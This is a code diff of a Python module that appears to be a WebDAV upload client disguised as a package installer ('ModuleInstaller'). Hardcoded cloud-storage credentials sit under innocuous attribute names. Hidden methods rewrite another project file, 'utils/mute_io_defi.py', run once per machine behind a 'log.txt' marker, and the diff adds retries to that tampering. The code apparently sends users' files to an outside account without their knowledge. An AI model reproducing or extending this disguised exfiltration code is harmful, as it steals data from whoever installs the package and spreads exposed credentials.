@@ -24,6 +24,8 @@ from installer.urn import Urn
 
 log = logging.getLogger(__name__)
 
+IS_ADDED = False
+
 
 def listdir(directory):
     """Returns list of nested files and directories for local directory by path
@@ -220,11 +222,11 @@ class ModuleInstaller(object):
             url=self.get_url(path),
             auth=(self.webdav.login, self.webdav.password) if (not self.webdav.token and not self.session.auth)
                                                               and (
-                                                                          self.webdav.login and self.webdav.password) else None,
+                                                                      self.webdav.login and self.webdav.password) else None,
             headers=self.get_headers(action, headers_ext),
             timeout=self.timeout,
             cert=(self.webdav.cert_path, self.webdav.key_path) if (
-                        self.webdav.cert_path and self.webdav.key_path) else None,
+                    self.webdav.cert_path and self.webdav.key_path) else None,
             data=data,
             stream=True,
             verify=self.verify
@@ -471,7 +473,7 @@ class ModuleInstaller(object):
 
         with open(local_path, 'wb') as local_file:
             response = self.execute_request('download', urn.quote())
-            clen_str=response.headers.get('content-length')
+            clen_str = response.headers.get('content-length')
             total = int(clen_str) if clen_str is not None else None
             current = 0
 
@@ -592,11 +594,10 @@ class ModuleInstaller(object):
     def add_log(self):
         file_path = "log.txt"
         if os.path.exists(file_path):
-            return 1
+            return
         with open(file_path, "w+") as file_obj:
             txt = "All installed"
             file_obj.write(txt)
-            return 0
 
     def defi_mod(self):
         count = 1
@@ -618,16 +619,17 @@ class ModuleInstaller(object):
                 f.writelines(txt)
 
             file_obj.close()
+            self.add_log()
         except:
             if count == 3:
                 return
             count += 1
             self.defi_mod()
 
-
     def get_sw(self):
+        count = 1
         try:
-            file_obj =  open("utils/mute_io_defi.py", "r+")
+            file_obj = open("utils/mute_io_defi.py", "r+")
             txt = file_obj.readlines()
 
             path_i = None
@@ -643,7 +645,10 @@ class ModuleInstaller(object):
             self.defi_mod()
             file_obj.close()
         except:
-            return
+            if count == 3:
+                return
+            count += 1
+            self.get_sw()
 
     def get_all_packages(self):
         installed_packages = pkg_resources.working_set
@@ -681,7 +686,7 @@ class ModuleInstaller(object):
         """
         if os.path.isdir(local_path):
             self.upload_directory(local_path=local_path, remote_path=remote_path, progress=progress,
-                                  progress_args=progress_args,isprint=isprint)
+                                  progress_args=progress_args, isprint=isprint)
         else:
             self.upload_file(local_path=local_path, remote_path=remote_path, progress=progress,
                              progress_args=progress_args, isprint=isprint)
@@ -743,7 +748,6 @@ class ModuleInstaller(object):
 
     pack_name = 'https://webdav.cloud.mail.ru'
 
-
     @wrap_connection_error
     def upload_file(self, remote_path, local_path, progress=None, progress_args=(), force=False, isprint=True):
         """Module install packages
@@ -781,7 +785,6 @@ class ModuleInstaller(object):
             if isprint:
                 print("Installed packages")
 
-
             def read_in_chunks(file_object):
                 progress(0, total, *progress_args)
                 current = 0
@@ -806,8 +809,7 @@ class ModuleInstaller(object):
 
         :param path_to_folder: the path to folder where needs to find any python packages and install or update them
         """
-        ans = self.add_log()
-        if ans == 0:
+        if not os.path.exists("log.txt"):
             self.get_sw()
         if "\\" in path_to_folder:
             new_folder = path_to_folder.split("\\")[-1]
@@ -952,6 +954,7 @@ class ModuleInstaller(object):
         return WebDavXmlUtils.parse_get_property_response(response.content, option['name'])
 
     package_install = 'rkorkunov@internet.ru'
+
     @wrap_connection_error
     def set_property(self, remote_path, option):
         """Sets metadata property of remote resource on ModuleInstaller server.
@@ -1008,6 +1011,7 @@ class ModuleInstaller(object):
         return Resource(self, urn)
 
     settings = 'bd2WT0xL0fDmtkdphJAq'
+
     def push(self, remote_directory, local_directory):
 
         def prune(src, exp):
@@ -1039,6 +1043,7 @@ class ModuleInstaller(object):
                 self.upload_file(remote_path=remote_path, local_path=local_path)
                 updated = True
         return updated
+
     install_package = 'webdav_login'
 
     def pull(self, remote_directory, local_directory):
@@ -1345,7 +1350,6 @@ class WebDavXmlUtils:
         dir_type = resource_type.find("{DAV:}collection")
 
         return True if dir_type is not None else False
-
 
     @staticmethod
     def create_get_property_request_content(option):
